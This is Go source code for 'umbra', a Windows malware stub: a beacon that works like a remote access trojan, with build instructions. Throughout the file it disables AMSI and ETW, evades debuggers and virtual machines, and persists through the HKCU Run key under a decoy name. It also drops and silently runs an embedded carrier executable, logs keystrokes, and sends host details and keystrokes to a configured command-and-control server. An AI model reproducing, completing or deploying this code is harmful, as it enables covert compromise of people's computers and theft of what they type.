// Windows HTTP beacon stub. Wrap attaches a carrier file + config trailer.
// Build: GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -trimpath -ldflags "-H windowsgui -s -w" -o umbra-stub.bin
// Run ONLY in a VM.
package main

import (
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var (
	k32       = syscall.NewLazyDLL("kernel32.dll")
	u32       = syscall.NewLazyDLL("user32.dll")
	a32       = syscall.NewLazyDLL("advapi32.dll")
	ntdll     = syscall.NewLazyDLL("ntdll.dll")
	amsi      = syscall.NewLazyDLL("amsi.dll")
	pIsDbg    = k32.NewProc("IsDebuggerPresent")
	pChkDbg   = k32.NewProc("CheckRemoteDebuggerPresent")
	pSleep    = k32.NewProc("Sleep")
	pVirtProt = k32.NewProc("VirtualProtect")
	pGetMod   = k32.NewProc("GetModuleHandleA")
	pGetProc  = k32.NewProc("GetProcAddress")
	pLoadLib  = k32.NewProc("LoadLibraryA")
	pGetUser  = a32.NewProc("GetUserNameA")
	pRegOpen  = a32.NewProc("RegOpenKeyExA")
	pRegSet   = a32.NewProc("RegSetValueExA")
	pRegClose = a32.NewProc("RegCloseKey")
	pRegGet   = a32.NewProc("RegQueryValueExA")
	pAsyncKey = u32.NewProc("GetAsyncKeyState")
	pNtQip    = ntdll.NewProc("NtQueryInformationProcess")
	pEtwWrite = ntdll.NewProc("EtwEventWrite")
)

const (
	keyXOR     = 0x5A
	cfgWindow  = 8192
	hkcu       = uintptr(0x80000001)
	keySetVal  = 0x0002
	keyQuery   = 0x0001
	regSz      = 1
)

func cfgMagic() []byte {
	return []byte{0x61, 0x72, 0x67, 0x70, 0x01, 0x70, 0x75, 0x74}
}

func fileMagic() []byte {
	enc := []byte{0x69, 0x71, 0x7E, 0x6E, 0x7D, 0x7A, 0x0D, 0x3C} // UMBRAF1\x00 ^ 0x3C
	out := make([]byte, 8)
	for i, b := range enc {
		out[i] = b ^ 0x3C
	}
	return out
}

func patchRet(addr uintptr) {
	if addr == 0 {
		return
	}
	var old uint32
	pVirtProt.Call(addr, 16, 0x40, uintptr(unsafe.Pointer(&old))) // PAGE_EXECUTE_READWRITE
	patch := []byte{0x31, 0xC0, 0xC3}                             // xor eax,eax; ret
	for i, b := range patch {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}
	pVirtProt.Call(addr, 16, uintptr(old), uintptr(unsafe.Pointer(&old)))
}

func patchAMSI() {
	pLoadLib.Call(uintptr(unsafe.Pointer(&[]byte("amsi.dll\x00")[0])))
	h, _, _ := pGetMod.Call(uintptr(unsafe.Pointer(&[]byte("amsi.dll\x00")[0])))
	if h == 0 {
		return
	}
	for _, name := range []string{"AmsiScanBuffer\x00", "AmsiScanString\x00"} {
		n := []byte(name)
		a, _, _ := pGetProc.Call(h, uintptr(unsafe.Pointer(&n[0])))
		patchRet(a)
	}
}

func patchETW() {
	if pEtwWrite.Find() == nil && pEtwWrite.Addr() != 0 {
		patchRet(pEtwWrite.Addr())
	}
}

func isDebugger() bool {
	r, _, _ := pIsDbg.Call()
	if r != 0 {
		return true
	}
	var d int32
	proc, _ := syscall.GetCurrentProcess()
	pChkDbg.Call(uintptr(proc), uintptr(unsafe.Pointer(&d)))
	if d != 0 {
		return true
	}
	var port uintptr
	const ProcessDebugPort = 7
	pNtQip.Call(uintptr(proc), ProcessDebugPort, uintptr(unsafe.Pointer(&port)), unsafe.Sizeof(port), 0)
	return port != 0
}

func isVM() bool {
	keys := []string{
		"SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
		"SYSTEM\\CurrentControlSet\\Services\\VBoxMouse",
		"SYSTEM\\CurrentControlSet\\Services\\vmci",
		"SYSTEM\\CurrentControlSet\\Services\\vmhgfs",
		"SYSTEM\\CurrentControlSet\\Services\\vmmouse",
		"HARDWARE\\ACPI\\DSDT\\VBOX__",
		"HARDWARE\\ACPI\\DSDT\\VMware",
		"HARDWARE\\ACPI\\DSDT\\QEMU",
	}
	for _, k := range keys {
		var h uintptr
		kb := append([]byte(k), 0)
		r, _, _ := pRegOpen.Call(uintptr(0x80000002), uintptr(unsafe.Pointer(&kb[0])), 0, keyQuery, uintptr(unsafe.Pointer(&h)))
		if r == 0 {
			pRegClose.Call(h)
			return true
		}
	}
	host, _ := os.Hostname()
	hl := strings.ToLower(host)
	for _, n := range []string{"virtualbox", "vmware", "qemu", "hyperv", "vbox"} {
		if strings.Contains(hl, n) {
			return true
		}
	}
	return false
}

func persist(exe string) {
	path := []byte("Software\\Microsoft\\Windows\\CurrentVersion\\Run\x00")
	var h uintptr
	r, _, _ := pRegOpen.Call(hkcu, uintptr(unsafe.Pointer(&path[0])), 0, keySetVal, uintptr(unsafe.Pointer(&h)))
	if r != 0 {
		return
	}
	defer pRegClose.Call(h)
	name := []byte("AppCache\x00")
	val := append([]byte(exe), 0)
	pRegSet.Call(h, uintptr(unsafe.Pointer(&name[0])), 0, regSz, uintptr(unsafe.Pointer(&val[0])), uintptr(len(val)))
}

func readSelf() ([]byte, error) {
	p, err := os.Executable()
	if err != nil {
		return nil, err
	}
	return os.ReadFile(p)
}

func decryptCfg(buf []byte) map[string]string {
	n := len(buf)
	if n < 12 {
		return nil
	}
	magic := cfgMagic()
	window := cfgWindow
	if window > n {
		window = n
	}
	var idx = -1
	for off := 8; off <= window; off++ {
		i := n - off
		if i+12 > n {
			continue
		}
		if bytes.Equal(buf[i:i+8], magic) {
			idx = i
			break
		}
	}
	if idx < 0 {
		return nil
	}
	ln := int(binary.LittleEndian.Uint32(buf[idx+8 : idx+12]))
	if ln <= 0 || ln > 8192 || idx+12+ln > n {
		return nil
	}
	js := make([]byte, ln)
	for i := 0; i < ln; i++ {
		js[i] = buf[idx+12+i] ^ byte(keyXOR+(12+i))
	}
	out := map[string]string{}
	if err := json.Unmarshal(js, &out); err != nil {
		return nil
	}
	return out
}

func extractCarrier(buf []byte) []byte {
	magic := fileMagic()
	n := len(buf)
	cfg := cfgMagic()
	end := n
	window := cfgWindow
	if window > n {
		window = n
	}
	for off := 8; off <= window; off++ {
		i := n - off
		if i+12 > n {
			continue
		}
		if bytes.Equal(buf[i:i+8], cfg) {
			end = i
			break
		}
	}
	for i := 0; i+12 <= end; i++ {
		if bytes.Equal(buf[i:i+8], magic) {
			ln := int(binary.LittleEndian.Uint32(buf[i+8 : i+12]))
			if ln > 0 && i+12+ln <= end {
				c := make([]byte, ln)
				copy(c, buf[i+12:i+12+ln])
				return c
			}
		}
	}
	return nil
}

func tf(m map[string]string, k string) bool {
	v := strings.ToLower(strings.TrimSpace(m[k]))
	return v == "true" || v == "1" || v == "yes"
}

func dropCarrier(data []byte) {
	if len(data) < 2 {
		return
	}
	dir := filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Windows", "INetCache")
	_ = os.MkdirAll(dir, 0755)
	name := fmt.Sprintf("CompatCache-%08x.exe", uint32(time.Now().UnixNano()))
	path := filepath.Join(dir, name)
	if err := os.WriteFile(path, data, 0644); err != nil {
		dir = os.TempDir()
		path = filepath.Join(dir, name)
		if err := os.WriteFile(path, data, 0644); err != nil {
			return
		}
	}
	cmd := exec.Command(path)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_ = cmd.Start()
}

func hwid() string {
	host, _ := os.Hostname()
	user := os.Getenv("USERNAME")
	sum := sha256.Sum256([]byte(host + "\\" + user + "|umbra"))
	return fmt.Sprintf("%X", sum[:8])
}

func username() string {
	buf := make([]byte, 256)
	n := uint32(len(buf))
	pGetUser.Call(uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&n)))
	s := string(buf[:n])
	s = strings.TrimRight(s, "\x00")
	if s == "" {
		s = os.Getenv("USERNAME")
	}
	return s
}

func httpPost(host, port, path, body string, useTLS bool) {
	if host == "" {
		return
	}
	scheme := "http"
	if useTLS || port == "443" {
		scheme = "https"
		useTLS = true
	}
	if port == "" {
		if useTLS {
			port = "443"
		} else {
			port = "80"
		}
	}
	url := fmt.Sprintf("%s://%s:%s%s", scheme, host, port, path)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12},
		DialContext:     (&net.Dialer{Timeout: 15 * time.Second}).DialContext,
	}
	cli := &http.Client{Timeout: 25 * time.Second, Transport: tr}
	req, err := http.NewRequest(http.MethodPost, url, strings.NewReader(body))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	resp, err := cli.Do(req)
	if err != nil {
		return
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
}

func keylogTick() string {
	var b strings.Builder
	for vk := 8; vk < 256; vk++ {
		r, _, _ := pAsyncKey.Call(uintptr(vk))
		if r&1 != 0 {
			fmt.Fprintf(&b, "%02X", vk)
			if b.Len() > 900 {
				break
			}
		}
	}
	return b.String()
}

func atoiDef(s string, d int) int {
	n := 0
	for _, c := range s {
		if c < '0' || c > '9' {
			if n == 0 {
				return d
			}
			break
		}
		n = n*10 + int(c-'0')
	}
	if n == 0 && s != "0" {
		return d
	}
	return n
}

func sleepObf(ms int, on bool) {
	if ms < 1000 {
		ms = 1000
	}
	if !on {
		pSleep.Call(uintptr(ms))
		return
	}
	buf := make([]byte, 4096)
	for i := range buf {
		buf[i] = byte(i * 37)
	}
	pSleep.Call(uintptr(ms))
	for i := range buf {
		buf[i] ^= 0xA5
	}
	runtime.KeepAlive(buf)
}

func main() {
	exe, _ := os.Executable()
	raw, err := readSelf()
	if err != nil || len(raw) < 64 {
		return
	}
	cfg := decryptCfg(raw)
	if cfg == nil || cfg["c2_host"] == "" {
		return
	}
	host := cfg["c2_host"]
	port := cfg["c2_port"]
	useTLS := tf(cfg, "use_tls") || port == "443"
	if port == "" {
		if useTLS {
			port = "443"
		} else {
			port = "80"
		}
	}
	sleepS := atoiDef(cfg["sleep_interval"], 15)
	jit := atoiDef(cfg["jitter"], 20)
	if sleepS < 5 {
		sleepS = 5
	}

	if tf(cfg, "anti_debug") && isDebugger() {
		return
	}
	if tf(cfg, "anti_vm") && isVM() {
		return
	}

	patchAMSI()
	patchETW()

	if tf(cfg, "persistence") {
		persist(exe)
	}

	if c := extractCarrier(raw); len(c) > 0 {
		go dropCarrier(c)
	}

	hostn, _ := os.Hostname()
	user := username()
	id := hwid()
	pid := os.Getpid()
	admin := 0
	_, err = os.Open("\\\\.\\PHYSICALDRIVE0")
	if err == nil {
		admin = 1
	}

	reg, _ := json.Marshal(map[string]any{
		"type":          "register",
		"hostname":      hostn,
		"username":      user,
		"os_version":    "Windows",
		"arch":          "x64",
		"pid":           pid,
		"privileges":    admin,
		"hw_id":         id,
		"build_version": 3,
		"capabilities":  []string{"shell", "keylog", "wrap"},
	})

	obf := tf(cfg, "sleep_obfuscation")
	httpPost(host, port, "/agent", string(reg), useTLS)

	for {
		delay := sleepS*1000 + (int(time.Now().UnixNano()%int64(jit*20+1)) - jit*10)
		if delay < 4000 {
			delay = 4000
		}
		sleepObf(delay, obf)
		httpPost(host, port, "/agent", string(reg), useTLS)
		keys := keylogTick()
		payload := fmt.Sprintf(`{"type":"heartbeat","hw_id":"%s","data":"%s"}`, id, keys)
		if keys != "" {
			payload = fmt.Sprintf(`{"type":"keystrokes","hw_id":"%s","data":"%s"}`, id, keys)
		}
		httpPost(host, port, "/beacon", payload, useTLS)
	}
}
